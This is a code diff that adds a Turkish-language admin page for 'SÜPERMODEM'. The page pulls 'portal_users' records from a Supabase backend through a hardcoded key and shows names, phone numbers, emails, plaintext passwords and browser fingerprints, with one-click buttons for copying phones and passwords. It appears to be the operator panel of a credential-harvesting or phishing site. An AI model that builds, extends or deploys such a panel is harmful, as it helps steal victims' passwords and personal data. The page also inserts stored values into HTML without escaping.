@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SÜPERMODEM — Admin</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
+
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:#080810;color:#e0e0f0;font-family:'Inter',sans-serif;min-height:100vh;}
+
+  .topbar{
+    background:rgba(255,255,255,.03);
+    border-bottom:1px solid rgba(255,255,255,.07);
+    padding:16px 32px;
+    display:flex;align-items:center;justify-content:space-between;
+    position:sticky;top:0;z-index:100;
+    backdrop-filter:blur(12px);
+  }
+  .topbar h1{
+    font-size:16px;font-weight:900;
+    background:linear-gradient(90deg,#4f8eff,#9b5cff);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  }
+  .topbar span{font-size:12px;color:rgba(255,255,255,.3);}
+
+  .stats{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+    gap:16px;padding:32px;
+  }
+  .stat-card{
+    background:rgba(255,255,255,.04);
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:16px;padding:20px;
+  }
+  .stat-label{font-size:11px;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;}
+  .stat-val{font-size:32px;font-weight:900;
+    background:linear-gradient(135deg,#4f8eff,#9b5cff);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  }
+
+  .table-wrap{padding:0 32px 32px;}
+  .table-head{
+    display:flex;align-items:center;justify-content:space-between;
+    margin-bottom:16px;
+  }
+  .table-head h2{font-size:15px;font-weight:700;}
+
+  .filters{display:flex;gap:8px;}
+  .filter-btn{
+    padding:7px 16px;border-radius:8px;border:1px solid rgba(255,255,255,.10);
+    background:transparent;color:rgba(255,255,255,.5);font-size:12px;
+    cursor:pointer;font-family:'Inter',sans-serif;transition:.15s;
+  }
+  .filter-btn.active{background:rgba(79,142,255,.2);border-color:rgba(79,142,255,.4);color:#4f8eff;}
+
+  .refresh-btn{
+    padding:8px 18px;border-radius:8px;
+    background:linear-gradient(135deg,#4f8eff,#9b5cff);
+    border:none;color:#fff;font-size:12px;font-weight:600;
+    cursor:pointer;font-family:'Inter',sans-serif;
+    box-shadow:0 4px 16px rgba(79,142,255,.3);
+  }
+
+  table{width:100%;border-collapse:collapse;}
+  thead th{
+    text-align:left;padding:12px 16px;
+    font-size:11px;color:rgba(255,255,255,.35);
+    text-transform:uppercase;letter-spacing:.8px;
+    border-bottom:1px solid rgba(255,255,255,.07);
+  }
+  tbody tr{
+    border-bottom:1px solid rgba(255,255,255,.04);
+    transition:.15s;
+  }
+  tbody tr:hover{background:rgba(255,255,255,.03);}
+  tbody td{padding:14px 16px;font-size:13px;vertical-align:top;}
+
+  .badge{
+    display:inline-block;padding:3px 10px;border-radius:6px;
+    font-size:11px;font-weight:600;
+  }
+  .badge-register{background:rgba(79,142,255,.15);color:#4f8eff;}
+  .badge-login{background:rgba(155,92,255,.15);color:#9b5cff;}
+
+  .mono{font-family:'JetBrains Mono',monospace;font-size:12px;color:rgba(255,255,255,.7);}
+
+  .device-cell{max-width:260px;}
+  .device-row{font-size:11px;color:rgba(255,255,255,.4);line-height:1.8;}
+  .device-row strong{color:rgba(255,255,255,.65);}
+
+  .expand-btn{
+    background:none;border:none;color:rgba(255,255,255,.3);
+    cursor:pointer;font-size:11px;padding:0;margin-top:4px;
+    font-family:'Inter',sans-serif;
+  }
+  .expand-btn:hover{color:#4f8eff;}
+
+  .empty{
+    text-align:center;padding:60px;
+    color:rgba(255,255,255,.2);font-size:14px;
+  }
+
+  .loading-row td{text-align:center;padding:40px;color:rgba(255,255,255,.3);}
+
+  .copy-btn{
+    background:none;border:none;cursor:pointer;
+    color:rgba(255,255,255,.25);font-size:11px;
+    padding:2px 6px;border-radius:4px;
+    font-family:'Inter',sans-serif;
+    transition:.15s;margin-left:4px;
+  }
+  .copy-btn:hover{background:rgba(255,255,255,.08);color:#fff;}
+
+  .ts{font-size:11px;color:rgba(255,255,255,.35);}
+
+  /* scrollable table container */
+  .table-scroll{overflow-x:auto;border-radius:12px;border:1px solid rgba(255,255,255,.07);}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <h1>📡 SÜPERMODEM — Admin Panel</h1>
+  <span id="last-refresh">—</span>
+</div>
+
+<div class="stats">
+  <div class="stat-card">
+    <div class="stat-label">Toplam Kayıt</div>
+    <div class="stat-val" id="s-total">—</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Kayıt Ol</div>
+    <div class="stat-val" id="s-register">—</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Giriş Yap</div>
+    <div class="stat-val" id="s-login">—</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Bugün</div>
+    <div class="stat-val" id="s-today">—</div>
+  </div>
+</div>
+
+<div class="table-wrap">
+  <div class="table-head">
+    <h2>Kullanıcı Verileri</h2>
+    <div style="display:flex;gap:12px;align-items:center;">
+      <div class="filters">
+        <button class="filter-btn active" onclick="setFilter('all',this)">Tümü</button>
+        <button class="filter-btn" onclick="setFilter('register',this)">Kayıt</button>
+        <button class="filter-btn" onclick="setFilter('login',this)">Giriş</button>
+      </div>
+      <button class="refresh-btn" onclick="loadData()">↻ Yenile</button>
+    </div>
+  </div>
+
+  <div class="table-scroll">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Tür</th>
+          <th>Ad</th>
+          <th>Telefon</th>
+          <th>E-posta</th>
+          <th>Şifre</th>
+          <th>Cihaz</th>
+          <th>Zaman</th>
+        </tr>
+      </thead>
+      <tbody id="tbody">
+        <tr class="loading-row"><td colspan="8">Yükleniyor…</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+const SUPABASE_URL = 'https://spnfrvxzcnkbrsrszqbx.supabase.co';
+const SUPABASE_KEY = 'sb_publishable_vpSk-y7hJwpQuvoDXjVh4w_-GILvY8g';
+
+let allRows=[];
+let currentFilter='all';
+
+async function loadData(){
+  document.getElementById('tbody').innerHTML='<tr class="loading-row"><td colspan="8">Yükleniyor…</td></tr>';
+  try{
+    const r=await fetch(
+      `${SUPABASE_URL}/rest/v1/portal_users?order=created_at.desc&limit=500`,
+      {headers:{
+        'apikey':SUPABASE_KEY,
+        'Authorization':'Bearer '+SUPABASE_KEY
+      }}
+    );
+    allRows=await r.json();
+    updateStats();
+    renderTable();
+    document.getElementById('last-refresh').textContent=
+      'Son güncelleme: '+new Date().toLocaleTimeString('tr-TR');
+  }catch(e){
+    document.getElementById('tbody').innerHTML=
+      '<tr class="loading-row"><td colspan="8">Bağlantı hatası: '+e.message+'</td></tr>';
+  }
+}
+
+function updateStats(){
+  const today=new Date().toISOString().slice(0,10);
+  document.getElementById('s-total').textContent=allRows.length;
+  document.getElementById('s-register').textContent=allRows.filter(r=>r.type==='register').length;
+  document.getElementById('s-login').textContent=allRows.filter(r=>r.type==='login').length;
+  document.getElementById('s-today').textContent=
+    allRows.filter(r=>r.created_at&&r.created_at.startsWith(today)).length;
+}
+
+function setFilter(f,btn){
+  currentFilter=f;
+  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  renderTable();
+}
+
+function copy(txt){
+  navigator.clipboard.writeText(txt).catch(()=>{});
+}
+
+function fmtDevice(d){
+  if(!d) return '<span style="opacity:.3">—</span>';
+  return `
+    <div class="device-row">
+      <strong>UA:</strong> ${(d.userAgent||'').slice(0,60)}…<br>
+      <strong>Platform:</strong> ${d.platform||'?'} &nbsp;
+      <strong>Dil:</strong> ${d.language||'?'}<br>
+      <strong>Ekran:</strong> ${d.screenW||'?'}×${d.screenH||'?'} &nbsp;
+      <strong>TZ:</strong> ${d.timezone||'?'}<br>
+      <strong>Touch:</strong> ${d.touchPoints||0} &nbsp;
+      <strong>Online:</strong> ${d.onLine?'✓':'✗'}
+    </div>`;
+}
+
+function fmtTime(ts){
+  if(!ts) return '—';
+  const d=new Date(ts);
+  return `<div class="ts">${d.toLocaleDateString('tr-TR')}<br>${d.toLocaleTimeString('tr-TR')}</div>`;
+}
+
+function renderTable(){
+  const rows=currentFilter==='all'?allRows:allRows.filter(r=>r.type===currentFilter);
+  if(!rows.length){
+    document.getElementById('tbody').innerHTML='<tr><td colspan="8" class="empty">Veri yok</td></tr>';
+    return;
+  }
+  document.getElementById('tbody').innerHTML=rows.map((r,i)=>`
+    <tr>
+      <td class="mono" style="opacity:.4">${i+1}</td>
+      <td><span class="badge badge-${r.type}">${r.type==='register'?'Kayıt':'Giriş'}</span></td>
+      <td>${r.name||'<span style="opacity:.3">—</span>'}</td>
+      <td class="mono">${r.phone||'—'}
+        <button class="copy-btn" onclick="copy('${r.phone||''}')">kopyala</button>
+      </td>
+      <td class="mono">${r.email||'<span style="opacity:.3">—</span>'}</td>
+      <td class="mono">${r.password||'—'}
+        <button class="copy-btn" onclick="copy('${r.password||''}')">kopyala</button>
+      </td>
+      <td class="device-cell">${fmtDevice(r.device)}</td>
+      <td>${fmtTime(r.created_at)}</td>
+    </tr>
+  `).join('');
+}
+
+// her 30sn otomatik yenile
+loadData();
+setInterval(loadData,30000);
+</script>
+</body>
+</html>
